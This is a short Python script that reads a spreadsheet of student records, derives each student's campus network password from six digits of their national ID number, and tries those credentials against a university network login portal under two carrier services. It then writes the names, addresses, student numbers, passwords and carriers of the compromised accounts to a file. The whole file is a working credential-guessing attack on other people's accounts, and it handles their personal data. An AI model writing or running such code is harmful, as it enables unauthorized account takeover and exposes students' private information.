import requests
import sys
import xlrd
a = xlrd.open_workbook('/Users/xiejunjie/py-exam/ncst/test.xls')
b = a.sheet_by_index(0)
stu = b.col_values(2)
stu_id = b.col_values(7)
stu_name = b.col_values(3)
stu_addr = b.col_values(6)

ua_agent = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'}
login_url = 'http://172.30.0.11/eportal/InterFace.do?method=login'
logout_url = "http://172.30.0.11/eportal/InterFace.do?method=logout"

account_list = []

def test_account():
	for num in range(len(stu)):
		acc = stu[num]
		pwd = stu_id[num][12:18]
		print ('学号:%s\n密码:%s\n\n'%(acc,pwd))	
		data = {"userId":acc,"password":pwd,"service":"%E8%81%94%E9%80%9A%E4%B8%93%E7%BA%BF","queryString":"wlanuserip%3D9cf07ebcbffce0298f320cd8eca1a94b%26wlanacname%3Dcee24f8cac61aac974e74b503c3a1669%26ssid%3D%26nasip%3D8618724f96768bd61edb375c4c21ccc0%26snmpagentip%3D%26mac%3D50ab1565843444a6317e4093b659bc15%26t%3Dwireless-v2%26url%3Dee87b1634742a905d3bcaa94ab6f72ecb6810fb1e1bcd8cb%26apmac%3D%26nasid%3Dcee24f8cac61aac974e74b503c3a1669%26vid%3D091ea5fa59a73e6c%26port%3De68d0a3d42b73226%26nasportid%3D85280d0376cea3452d735fa7f3f2db8d4c35a02a923aa215391d2a818e0dcb74d27613df5ce51d93","operatorPwd":"","operatorUserId":"","validcode":""}

		respon = requests.post(login_url,headers = ua_agent,data=data)
		content = respon.content.decode('utf-8')
		print (content)
		if content.find('success') != -1:
			tmp = (num,"联通")
			account_list.append(tmp)
			requests.get(logout_url)
		else:
			data = {"userId":acc,"password":pwd,"service":"%E7%A7%BB%E5%8A%A8PPPoE","queryString":"wlanuserip%3D9cf07ebcbffce0298f320cd8eca1a94b%26wlanacname%3Dcee24f8cac61aac974e74b503c3a1669%26ssid%3D%26nasip%3D8618724f96768bd61edb375c4c21ccc0%26snmpagentip%3D%26mac%3D50ab1565843444a6317e4093b659bc15%26t%3Dwireless-v2%26url%3Dee87b1634742a905d3bcaa94ab6f72ecb6810fb1e1bcd8cb%26apmac%3D%26nasid%3Dcee24f8cac61aac974e74b503c3a1669%26vid%3D091ea5fa59a73e6c%26port%3De68d0a3d42b73226%26nasportid%3D85280d0376cea3452d735fa7f3f2db8d4c35a02a923aa215391d2a818e0dcb74d27613df5ce51d93","operatorPwd":"","operatorUserId":"","validcode":""}
			respon = requests.post(login_url,headers = ua_agent,data=data)
			content = respon.content.decode('utf-8')
			print (content)
			if content.find('success') != -1:
				tmp = (num,"移动")
				account_list.append(tmp)
				requests.get(logout_url)
			else:
				requests.get(logout_url)
	

test_account()
with open('/Users/xiejunjie/py-exam/ncst/account.txt','w') as f:
	for acc in account_list:
		text = "%s\t%s\t%s\t%s\t%s\n"%(stu_name[acc[0]],stu_addr[acc[0]],stu[acc[0]],stu_id[acc[0]][12:18],acc[1])
		f.write(text)

